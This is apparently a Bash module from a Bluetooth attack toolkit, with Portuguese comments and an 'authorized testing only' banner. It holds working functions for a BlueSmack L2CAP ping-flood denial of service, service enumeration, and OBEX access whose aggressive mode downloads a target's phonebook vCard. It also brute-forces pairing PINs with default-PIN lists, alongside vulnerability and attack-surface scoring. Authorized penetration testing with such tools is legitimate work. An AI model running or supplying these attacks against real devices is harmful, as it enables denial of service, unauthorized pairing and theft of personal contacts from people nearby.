#!/bin/bash
# lib/attacks.sh - Módulo de ataques Bluetooth reais
# ATENÇÃO: Para uso educacional e testes autorizados apenas

set -euo pipefail

# Importar dependências
source "$(dirname "${BASH_SOURCE[0]}")/utils.sh"
source "$(dirname "${BASH_SOURCE[0]}")/bluetooth.sh"

# Configurações de ataque
readonly MAX_PING_COUNT=1000
readonly DEFAULT_L2CAP_PSM=1
readonly SDP_TIMEOUT=30
readonly PIN_BRUTEFORCE_DELAY=1
readonly OBEX_TIMEOUT=10

# BlueSmack Attack (DoS via L2CAP ping overflow)
bluesmack_attack() {
    local target="$1"
    local count="${2:-100}"
    local size="${3:-600}"
    
    validate_mac_address "$target" || {
        log_message "ERROR" "MAC address inválido: $target"
        return 1
    }
    
    log_message "INFO" "Iniciando BlueSmack contra $target (count=$count, size=$size)"
    
    # Verificar se dispositivo está alcançável
    if ! l2ping -c 1 -t 5 "$target" >/dev/null 2>&1; then
        log_message "WARNING" "Dispositivo $target não responde a ping L2CAP"
        return 1
    fi
    
    # Executar ataque BlueSmack
    local start_time=$(date +%s)
    local success_count=0
    local fail_count=0
    
    for ((i=1; i<=count; i++)); do
        if l2ping -c 1 -s "$size" "$target" >/dev/null 2>&1; then
            ((success_count++))
        else
            ((fail_count++))
        fi
        
        # Mostrar progresso a cada 10 pacotes
        if ((i % 10 == 0)); then
            local elapsed=$(($(date +%s) - start_time))
            echo "Enviados: $i/$count | Sucessos: $success_count | Falhas: $fail_count | Tempo: ${elapsed}s"
        fi
        
        # Pequeno delay para evitar sobrecarga
        sleep 0.01
    done
    
    local end_time=$(date +%s)
    local total_time=$((end_time - start_time))
    
    echo "BlueSmack concluído:"
    echo "  Total enviado: $count pacotes"
    echo "  Sucessos: $success_count"
    echo "  Falhas: $fail_count"
    echo "  Tempo total: ${total_time}s"
    echo "  Taxa: $((count / total_time)) pacotes/s"
    
    log_message "SUCCESS" "BlueSmack contra $target concluído - $success_count/$count sucessos"
    return 0
}

# Enumeração SDP avançada
sdp_enumeration() {
    local target="$1"
    local output_file="${2:-/tmp/sdp_enum_$$.txt}"
    
    validate_mac_address "$target" || return 1
    
    log_message "INFO" "Iniciando enumeração SDP em $target"
    
    # Verificar conectividade básica
    if ! l2ping -c 1 -t 5 "$target" >/dev/null 2>&1; then
        log_message "ERROR" "Dispositivo $target não está alcançável"
        return 1
    fi
    
    # Enumeração básica de serviços
    echo "=== SDP Service Discovery para $target ===" > "$output_file"
    echo "Timestamp: $(date)" >> "$output_file"
    echo "" >> "$output_file"
    
    # Buscar todos os serviços disponíveis
    echo "Executando sdptool browse $target..."
    if timeout $SDP_TIMEOUT sdptool browse "$target" >> "$output_file" 2>&1; then
        echo "Enumeração SDP básica concluída"
    else
        echo "Falha na enumeração SDP básica"
        return 1
    fi
    
    # Buscar serviços específicos conhecidos
    local services=("AudioSource" "AudioSink" "A2DP" "AVRCP" "HID" "HFP" "HSP" "OPP" "FTP" "BIP" "BPP" "DUN" "FAX" "LAP" "NAP" "PANU")
    
    echo "" >> "$output_file"
    echo "=== Busca de Serviços Específicos ===" >> "$output_file"
    
    for service in "${services[@]}"; do
        echo -n "Verificando $service... "
        if timeout 10 sdptool search --bdaddr "$target" "$service" >> "$output_file" 2>&1; then
            echo "OK"
        else
            echo "N/A"
        fi
    done
    
    # Buscar informações de dispositivo
    echo "" >> "$output_file"
    echo "=== Informações do Dispositivo ===" >> "$output_file"
    
    if command -v hcitool >/dev/null 2>&1; then
        echo "--- Nome do dispositivo ---" >> "$output_file"
        timeout 10 hcitool name "$target" >> "$output_file" 2>&1 || echo "Nome não disponível" >> "$output_file"
        
        echo "--- Informações de classe ---" >> "$output_file"
        timeout 10 hcitool info "$target" >> "$output_file" 2>&1 || echo "Informações não disponíveis" >> "$output_file"
    fi
    
    # Análise de resultados
    local service_count=$(grep -c "Service Name:" "$output_file" 2>/dev/null || echo "0")
    local protocol_count=$(grep -c "Protocol Descriptor List:" "$output_file" 2>/dev/null || echo "0")
    
    echo ""
    echo "Enumeração SDP concluída:"
    echo "  Arquivo de saída: $output_file"
    echo "  Serviços encontrados: $service_count"
    echo "  Protocolos detectados: $protocol_count"
    
    log_message "SUCCESS" "SDP enumeration para $target concluída - $service_count serviços"
    return 0
}

# Exploração OBEX
obex_exploitation() {
    local target="$1"
    local mode="${2:-safe}"  # safe, aggressive
    local output_dir="${3:-/tmp/obex_results_$$}"
    
    validate_mac_address "$target" || return 1
    
    log_message "INFO" "Iniciando exploração OBEX em $target (modo: $mode)"
    
    mkdir -p "$output_dir"
    
    # Verificar se OBEX está disponível
    if ! command -v obexftp >/dev/null 2>&1; then
        echo "obexftp não encontrado. Instalando..."
        if command -v apt-get >/dev/null 2>&1; then
            sudo apt-get update && sudo apt-get install -y obexftp
        else
            echo "Por favor, instale obexftp manualmente"
            return 1
        fi
    fi
    
    # Teste de conectividade OBEX
    echo "Testando conectividade OBEX..."
    
    # Tentar conectar via diferentes canais OBEX
    local obex_channels=(9 10 11 12)
    local successful_channel=""
    
    for channel in "${obex_channels[@]}"; do
        echo "Testando canal $channel..."
        if timeout $OBEX_TIMEOUT obexftp -b "$target" -B "$channel" -l / >/dev/null 2>&1; then
            successful_channel="$channel"
            echo "Conectividade OBEX estabelecida no canal $channel"
            break
        fi
    done
    
    if [[ -z "$successful_channel" ]]; then
        echo "Nenhuma conectividade OBEX encontrada"
        log_message "WARNING" "OBEX não disponível em $target"
        return 1
    fi
    
    # Exploração baseada no modo
    if [[ "$mode" == "safe" ]]; then
        # Modo seguro - apenas listagem
        echo "Executando exploração OBEX segura..."
        
        # Listar diretório raiz
        echo "Listando diretório raiz..."
        timeout $OBEX_TIMEOUT obexftp -b "$target" -B "$successful_channel" -l / > "$output_dir/root_listing.txt" 2>&1
        
        # Tentar listar diretórios comuns
        local common_dirs=("telecom" "pictures" "music" "videos" "documents")
        for dir in "${common_dirs[@]}"; do
            echo "Tentando listar $dir..."
            timeout $OBEX_TIMEOUT obexftp -b "$target" -B "$successful_channel" -l "/$dir" > "$output_dir/${dir}_listing.txt" 2>&1
        done
        
    elif [[ "$mode" == "aggressive" ]]; then
        # Modo agressivo - tentar download
        echo "⚠️  Executando exploração OBEX agressiva..."
        echo "⚠️  Isso pode deixar rastros no dispositivo alvo"
        
        # Listar e tentar download de arquivos
        if timeout $OBEX_TIMEOUT obexftp -b "$target" -B "$successful_channel" -l / > "$output_dir/detailed_listing.txt" 2>&1; then
            # Procurar por arquivos interessantes
            if grep -q "\.vcf" "$output_dir/detailed_listing.txt"; then
                echo "Encontrados arquivos vCard - tentando download..."
                timeout $OBEX_TIMEOUT obexftp -b "$target" -B "$successful_channel" -g "telecom/pb.vcf" -o "$output_dir/" 2>&1
            fi
            
            if grep -q "\.jpg\|\.png" "$output_dir/detailed_listing.txt"; then
                echo "Encontradas imagens - listando apenas (não baixando por questões éticas)"
            fi
        fi
    fi
    
    # Relatório de resultados
    echo ""
    echo "Exploração OBEX concluída:"
    echo "  Canal usado: $successful_channel"
    echo "  Modo: $mode"
    echo "  Resultados em: $output_dir"
    
    if [[ -f "$output_dir/root_listing.txt" ]]; then
        local file_count=$(wc -l < "$output_dir/root_listing.txt" 2>/dev/null || echo "0")
        echo "  Arquivos/diretórios encontrados: $file_count"
    fi
    
    log_message "SUCCESS" "OBEX exploitation para $target concluída"
    return 0
}

# Brute force de PIN inteligente
pin_bruteforce_intelligent() {
    local target="$1"
    local device_type="${2:-generic}"
    local wordlist="${3:-}"
    
    validate_mac_address "$target" || return 1
    
    log_message "INFO" "Iniciando PIN brute force em $target (tipo: $device_type)"
    
    # Verificar se simple-agent ou bluetooth-agent estão disponíveis
    local pairing_tool=""
    if command -v simple-agent >/dev/null 2>&1; then
        pairing_tool="simple-agent"
    elif command -v bluetooth-agent >/dev/null 2>&1; then
        pairing_tool="bluetooth-agent"
    else
        echo "Nenhuma ferramenta de pairing encontrada"
        return 1
    fi
    
    # Gerar lista de PINs baseada no tipo de dispositivo
    local pin_list=()
    
    case "$device_type" in
        "phone"|"smartphone")
            pin_list=("0000" "1234" "1111" "2222" "1212" "0001" "1234567890" "0123" "9999")
            ;;
        "headset"|"audio")
            pin_list=("0000" "1234" "1111" "8888" "0001")
            ;;
        "keyboard"|"mouse"|"hid")
            pin_list=("000000" "123456" "111111" "0000")
            ;;
        *)
            pin_list=("0000" "1234" "1111" "2222" "3333" "4444" "5555" "6666" "7777" "8888" "9999" "1212" "2121")
            ;;
    esac
    
    # Usar wordlist customizada se fornecida
    if [[ -n "$wordlist" && -f "$wordlist" ]]; then
        echo "Usando wordlist customizada: $wordlist"
        mapfile -t pin_list < "$wordlist"
    fi
    
    echo "Testando ${#pin_list[@]} PINs contra $target..."
    echo "⚠️  Dispositivo pode bloquear após várias tentativas falhas"
    echo ""
    
    local attempt=0
    local max_attempts=${#pin_list[@]}
    
    for pin in "${pin_list[@]}"; do
        ((attempt++))
        echo -n "[$attempt/$max_attempts] Testando PIN: $pin... "
        
        # Remover pairing anterior se existir
        echo "$pin" | timeout 15 bluetoothctl remove "$target" >/dev/null 2>&1 || true
        sleep 1
        
        # Tentar pairing
        echo "$pin" | timeout 15 bluetoothctl pair "$target" >/dev/null 2>&1
        local result=$?
        
        if [[ $result -eq 0 ]]; then
            echo "✅ SUCESSO!"
            echo ""
            echo "🎉 PIN encontrado: $pin"
            echo "🎯 Target: $target"
            echo "📱 Tipo: $device_type"
            
            log_message "SUCCESS" "PIN encontrado para $target: $pin"
            
            # Remover pairing por segurança
            bluetoothctl remove "$target" >/dev/null 2>&1 || true
            
            return 0
        else
            echo "❌"
        fi
        
        # Delay entre tentativas para evitar bloqueio
        sleep $PIN_BRUTEFORCE_DELAY
        
        # Verificar se dispositivo ainda está disponível a cada 5 tentativas
        if ((attempt % 5 == 0)); then
            echo "Verificando disponibilidade do dispositivo..."
            if ! l2ping -c 1 -t 5 "$target" >/dev/null 2>&1; then
                echo "⚠️  Dispositivo não responde - pode estar bloqueado"
                echo "Aguardando 30 segundos..."
                sleep 30
            fi
        fi
    done
    
    echo ""
    echo "❌ Brute force concluído sem sucesso"
    echo "Testados: $max_attempts PINs"
    
    log_message "INFO" "PIN brute force para $target concluído - sem sucesso"
    return 1
}

# Análise de vulnerabilidades
vulnerability_scanner() {
    local services_data="$1"
    local target="${2:-unknown}"
    
    echo "=== Análise de Vulnerabilidades ===" 
    echo "Target: $target"
    echo "Timestamp: $(date)"
    echo ""
    
    local vuln_count=0
    
    # Verificar vulnerabilidades conhecidas
    
    # 1. Serviços inseguros
    if echo "$services_data" | grep -qi "Serial Port\|SPP"; then
        echo "🔴 VULNERABILIDADE: Serial Port Profile (SPP) detectado"
        echo "   Risco: Acesso serial não autenticado"
        echo "   Recomendação: Desabilitar SPP se não necessário"
        echo ""
        ((vuln_count++))
    fi
    
    # 2. FTP/OBEX sem autenticação
    if echo "$services_data" | grep -qi "OBEX Object Push\|FTP"; then
        echo "🟡 ATENÇÃO: OBEX/FTP disponível"
        echo "   Risco: Possível acesso a arquivos"
        echo "   Recomendação: Verificar autenticação"
        echo ""
        ((vuln_count++))
    fi
    
    # 3. HID sem proteção
    if echo "$services_data" | grep -qi "Human Interface Device\|HID"; then
        echo "🟡 ATENÇÃO: HID Profile detectado"
        echo "   Risco: Possível injeção de teclado"
        echo "   Recomendação: Verificar autenticação de pairing"
        echo ""
        ((vuln_count++))
    fi
    
    # 4. Serviços de desenvolvimento
    if echo "$services_data" | grep -qi "Service Discovery\|SDP"; then
        echo "ℹ️  INFO: SDP ativo (comportamento normal)"
        echo "   Observação: Permite enumeração de serviços"
        echo ""
    fi
    
    # 5. Análise de versão Bluetooth
    if echo "$services_data" | grep -qi "version.*1\|version.*2\.0"; then
        echo "🔴 VULNERABILIDADE: Versão Bluetooth antiga detectada"
        echo "   Risco: Vulnerabilidades de protocolo conhecidas"
        echo "   Recomendação: Atualizar para Bluetooth 4.0+"
        echo ""
        ((vuln_count++))
    fi
    
    echo "=== Resumo da Análise ==="
    echo "Vulnerabilidades encontradas: $vuln_count"
    
    if [[ $vuln_count -eq 0 ]]; then
        echo "✅ Nenhuma vulnerabilidade óbvia detectada"
    elif [[ $vuln_count -le 2 ]]; then
        echo "🟡 Nível de risco: BAIXO a MÉDIO"
    else
        echo "🔴 Nível de risco: ALTO"
    fi
    
    return $vuln_count
}

# Análise de superfície de ataque
analyze_attack_surface() {
    local services_data="$1"
    
    echo "=== Análise de Superfície de Ataque ==="
    echo ""
    
    local attack_vectors=()
    local risk_score=0
    
    # Identificar vetores de ataque
    if echo "$services_data" | grep -qi "OBEX\|FTP"; then
        attack_vectors+=("Transferência de arquivos (OBEX/FTP)")
        ((risk_score += 3))
    fi
    
    if echo "$services_data" | grep -qi "SPP\|Serial"; then
        attack_vectors+=("Acesso serial (SPP)")
        ((risk_score += 4))
    fi
    
    if echo "$services_data" | grep -qi "HID"; then
        attack_vectors+=("Injeção de entrada (HID)")
        ((risk_score += 5))
    fi
    
    if echo "$services_data" | grep -qi "Audio\|A2DP"; then
        attack_vectors+=("Interceptação de áudio")
        ((risk_score += 2))
    fi
    
    if echo "$services_data" | grep -qi "Network\|PAN\|NAP"; then
        attack_vectors+=("Acesso de rede")
        ((risk_score += 4))
    fi
    
    # Exibir vetores encontrados
    echo "Vetores de ataque identificados:"
    if [[ ${#attack_vectors[@]} -eq 0 ]]; then
        echo "  ✅ Nenhum vetor óbvio identificado"
    else
        for vector in "${attack_vectors[@]}"; do
            echo "  🎯 $vector"
        done
    fi
    
    echo ""
    echo "Score de risco: $risk_score/20"
    
    if [[ $risk_score -le 5 ]]; then
        echo "🟢 Superfície de ataque: BAIXA"
    elif [[ $risk_score -le 10 ]]; then
        echo "🟡 Superfície de ataque: MÉDIA" 
    else
        echo "🔴 Superfície de ataque: ALTA"
    fi
    
    return 0
} 